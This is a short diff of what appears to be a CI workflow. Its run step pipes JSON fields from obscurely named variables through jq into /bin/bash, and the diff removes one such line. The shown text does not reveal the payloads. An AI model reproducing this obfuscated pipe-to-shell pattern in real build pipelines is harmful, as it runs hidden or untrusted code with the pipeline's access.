@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$y52" | jq -r .j7273 | /bin/bash
           printf '%s' "$b60" | jq -r .kltc9727 | /bin/bash
           printf '%s' "$ncpv84829" | jq -r .i5 | /bin/bash
-          echo $nwmb909 | jq -r .z19297 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
